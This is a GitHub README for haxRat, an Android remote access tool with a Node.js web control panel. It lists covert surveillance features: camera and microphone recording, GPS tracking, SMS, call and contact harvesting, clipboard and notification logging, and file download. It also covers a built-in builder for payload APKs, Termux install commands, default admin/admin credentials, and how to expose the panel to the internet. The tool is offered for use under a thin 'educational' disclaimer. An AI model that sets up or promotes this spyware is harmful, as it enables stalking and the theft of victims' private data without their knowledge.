<p align="center">
<img src="https://github.com/Anon4You/haxRat/raw/master/server/assets/webpublic/logo.png" height="60"><br>
A cloud based remote android managment suite, powered by NodeJS
</p>

> **Note:** This is a fixed version of the original haxRat by hax4us, updated to work with current Termux.

## Features
- Screenshot Capture
- Screen Recorder
- Rear Camera Recorder
- Front Camera Recorder
- Lock Device
- GPS Logging
- Microphone Recording
- View Contacts
- SMS Logs
- Send SMS
- Call Logs
- View Installed Apps
- View Stub Permissions
- Live Clipboard Logging
- Live Notification Logging
- View WiFi Networks (logs previously seen)
- File Explorer & Downloader
- Command Queuing
- Built In APK Builder

## TODO
- Call Blocker

## Changes from Original
- Uses `apkeditor` instead of `apktool`
- Uses `apksigner` instead of `sign.jar` for signing APKs
- Fixed compatibility with current Termux

## Installation

### For TermuxVoid Users
```bash
apt install hazrat -y
hazrat
```

### For Termux Users
```bash
apt install tur-repo
apt install apkeditor npm apksigner
git clone https://github.com/Anon4You/haxRat.git
cd haxRat/server
npm install
node index.js
```

### Access Web Panel
Navigate to `http://<SERVER IP>:22533` in your browser.

> **Default Login Credentials**
> - Username: `admin`
> - Password: `admin`

To access over WAN, you can use [PORTMAP](https://portmap.io) to expose your local server.

## Thanks
- Inspiration for the project and the basic building blocks for the Android App are based off [L3MON](https://github.com/D3VL/L3MON)
- Original project by [hax4us](https://github.com/hax4us/haxRat)
- [express](https://github.com/expressjs/express)
- [node-geoip](https://github.com/bluesmoon/node-geoip)
- [lowdb](https://github.com/typicode/lowdb)
- [socket.io](https://github.com/socketio/socket.io)
- [Open Street Map](https://www.openstreetmap.org)
- [Leaflet](https://leafletjs.com/)

## Disclaimer
<b>This software is provided as-is with no warranty. The author will not be responsible for any direct or indirect damage caused due to the usage of this tool.<br>
haxRat is built for both Educational and Internal use ONLY.</b>
